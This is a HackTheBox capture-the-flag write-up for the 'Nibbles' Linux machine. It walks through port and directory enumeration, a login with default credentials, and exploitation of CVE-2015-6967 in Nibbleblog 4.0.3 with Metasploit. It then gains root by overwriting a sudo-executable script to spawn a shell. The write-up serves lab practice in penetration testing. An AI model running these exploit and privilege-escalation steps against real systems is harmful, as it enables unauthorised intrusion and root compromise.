# Nibbles

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running Nibbleblog 4.0.3, vulnerable to CVE-2015-6967,
an authenticated file upload vulnerability. Default credentials grant
admin access. Privilege escalation achieved by overwriting a writable
script that can be executed as root via sudo.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.75 -oG allPorts
nmap -sCV -p22,80 (IP) -oN targeted
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH OpenSSH |
| 80 | HTTP Apache |

TTL=63 confirms Linux target.

---

## 2. Web Enumeration

Found `/nibbleblog/` directory in page source code.

Ran wfuzz to enumerate directories:

```bash
wfuzz -c --hc=404 -t 200 \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
http://10.10.10.75/nibbleblog/FUZZ
```

Found `/content/private/users.xml` confirming username: **admin**

Enumerated PHP files:

```bash
wfuzz -c --hc=404 -t 200 \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
http://10.10.10.75/nibbleblog/FUZZ.php
```

Found `admin.php` login panel.

---

## 3. Exploitation

Logged in with credentials `admin:nibbles`.

Identified Nibbleblog 4.0.3 vulnerable to CVE-2015-6967.

Exploited using Metasploit:

```bash
msfconsole
search CVE-2015-6967
use 0
set RHOST 10.10.10.75
set LHOST tun0
set TARGETURI /nibbleblog/
set USERNAME admin
set PASSWORD nibbles
run
```

Received Meterpreter session as **nibbler**.

Retrieved user flag:

```bash
shell
cat /home/nibbler/user.txt
```

---

## 4. Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Extracted zip file in home directory:

```bash
cd /home/nibbler
unzip personal.zip
```

Overwrote writable monitor.sh with reverse shell payload:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash' >> /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Received shell as **root**.

Retrieved root flag:

```bash
cat /root/root.txt
```

---

## 5. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| wfuzz | Directory and file enumeration |
| Wappalyzer | Technology fingerprinting |
| searchsploit | Vulnerability research |
| Metasploit | CVE-2015-6967 exploitation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| CVE-2015-6967 | Nibbleblog authenticated file upload RCE |
| Default Credentials | admin:nibbles accepted |
| sudo Misconfiguration | Writable script executable as root |
